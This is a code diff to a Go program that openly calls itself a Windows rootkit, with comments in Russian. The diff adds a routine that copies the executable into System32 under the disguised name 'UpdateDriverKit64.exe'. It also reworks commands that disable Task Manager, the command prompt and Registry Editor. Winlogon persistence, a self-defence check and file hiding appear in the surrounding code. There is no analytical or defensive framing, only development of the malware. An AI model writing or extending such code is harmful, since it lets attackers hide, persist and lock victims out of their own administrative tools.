@@ -289,6 +289,57 @@ func enableRegistryEditor() error {
 	return nil
 }
 
+// Установка руткита в System32 с новым именем
+func install() error {
+	// Получаем путь к текущему исполняемому файлу
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("failed to get executable path: %v", err)
+	}
+
+	// Путь назначения в System32 с новым именем
+	targetPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "UpdateDriverKit64.exe")
+
+	// Копируем файл
+	err = copyFile(exePath, targetPath)
+	if err != nil {
+		return fmt.Errorf("failed to copy file: %v", err)
+	}
+
+	fmt.Printf("Rootkit installed to: %s\n", targetPath)
+	return nil
+}
+
+// Удаление руткита из System32
+func uninstall() error {
+	// Путь к файлу в System32
+	targetPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "UpdateDriverKit64.exe")
+
+	// Удаляем файл
+	err := os.Remove(targetPath)
+	if err != nil {
+		return fmt.Errorf("failed to remove file: %v", err)
+	}
+
+	fmt.Printf("Rootkit removed from: %s\n", targetPath)
+	return nil
+}
+
+// Копирование файла
+func copyFile(src, dst string) error {
+	input, err := os.ReadFile(src)
+	if err != nil {
+		return fmt.Errorf("failed to read source file: %v", err)
+	}
+
+	err = os.WriteFile(dst, input, 0644)
+	if err != nil {
+		return fmt.Errorf("failed to write destination file: %v", err)
+	}
+
+	return nil
+}
+
 func main() {
 	if !SelfDefense() {
 		fmt.Println("SelfDefense failed, but continuing execution...")
@@ -297,15 +348,12 @@ func main() {
 	if len(os.Args) < 2 {
 		fmt.Println("This rootkit hides files and folders with the '$ks69' prefix!")
 		fmt.Println("Usage:")
-		fmt.Println("  rootkit show|hide <path>")
-		fmt.Println("  rootkit winlogon <programPath>")
+		fmt.Println("  rootkit <path> show/hide")
+		fmt.Println("  rootkit <programPath> winlogon")
 		fmt.Println("  rootkit unwinlogon")
-		fmt.Println("  rootkit disabletaskmgr")
-		fmt.Println("  rootkit enabletaskmgr")
-		fmt.Println("  rootkit disablecmd")
-		fmt.Println("  rootkit enablecmd")
-		fmt.Println("  rootkit disableregistry")
-		fmt.Println("  rootkit enableregistry")
+		fmt.Println("  rootkit disable/enable cmd/taskmgr/registry")
+		fmt.Println("  rootkit install")
+		fmt.Println("  rootkit uninstall")
 		return
 	}
 
@@ -314,7 +362,7 @@ func main() {
 	switch action {
 	case "show", "hide":
 		if len(os.Args) != 3 {
-			fmt.Println("Usage: rootkit <path> <show|hide>")
+			fmt.Println("Usage: rootkit <path> show/hide")
 			return
 		}
 
@@ -371,37 +419,59 @@ func main() {
 			log.Fatalf("Failed to remove from Winlogon: %v", err)
 		}
 
-	case "disabletaskmgr":
-		if err := disableTaskManager(); err != nil {
-			log.Fatalf("Failed to disable Task Manager: %v", err)
+	case "disable", "enable":
+		if len(os.Args) != 3 {
+			fmt.Println("Usage: rootkit disable/enable cmd/taskmgr/registry")
+			return
 		}
 
-	case "enabletaskmgr":
-		if err := enableTaskManager(); err != nil {
-			log.Fatalf("Failed to enable Task Manager: %v", err)
+		target := os.Args[2]
+		switch target {
+		case "cmd":
+			if action == "disable" {
+				if err := disableCMD(); err != nil {
+					log.Fatalf("Failed to disable CMD: %v", err)
+				}
+			} else {
+				if err := enableCMD(); err != nil {
+					log.Fatalf("Failed to enable CMD: %v", err)
+				}
+			}
+		case "taskmgr":
+			if action == "disable" {
+				if err := disableTaskManager(); err != nil {
+					log.Fatalf("Failed to disable Task Manager: %v", err)
+				}
+			} else {
+				if err := enableTaskManager(); err != nil {
+					log.Fatalf("Failed to enable Task Manager: %v", err)
+				}
+			}
+		case "registry":
+			if action == "disable" {
+				if err := disableRegistryEditor(); err != nil {
+					log.Fatalf("Failed to disable Registry Editor: %v", err)
+				}
+			} else {
+				if err := enableRegistryEditor(); err != nil {
+					log.Fatalf("Failed to enable Registry Editor: %v", err)
+				}
+			}
+		default:
+			fmt.Println("Invalid target. Use 'cmd', 'taskmgr', or 'registry'.")
 		}
 
-	case "disablecmd":
-		if err := disableCMD(); err != nil {
-			log.Fatalf("Failed to disable CMD: %v", err)
+	case "install":
+		if err := install(); err != nil {
+			log.Fatalf("Failed to install rootkit: %v", err)
 		}
 
-	case "enablecmd":
-		if err := enableCMD(); err != nil {
-			log.Fatalf("Failed to enable CMD: %v", err)
-		}
-
-	case "disableregistry":
-		if err := disableRegistryEditor(); err != nil {
-			log.Fatalf("Failed to disable Registry Editor: %v", err)
-		}
-
-	case "enableregistry":
-		if err := enableRegistryEditor(); err != nil {
-			log.Fatalf("Failed to enable Registry Editor: %v", err)
+	case "uninstall":
+		if err := uninstall(); err != nil {
+			log.Fatalf("Failed to uninstall rootkit: %v", err)
 		}
 
 	default:
-		fmt.Println("Invalid action. Use 'show', 'hide', 'winlogon', 'unwinlogon', 'disabletaskmgr', 'enabletaskmgr', 'disablecmd', 'enablecmd', 'disableregistry', or 'enableregistry'.")
+		fmt.Println("Invalid action. Use 'show', 'hide', 'winlogon', 'unwinlogon', 'disable', 'enable', 'install', or 'uninstall'.")
 	}
 }
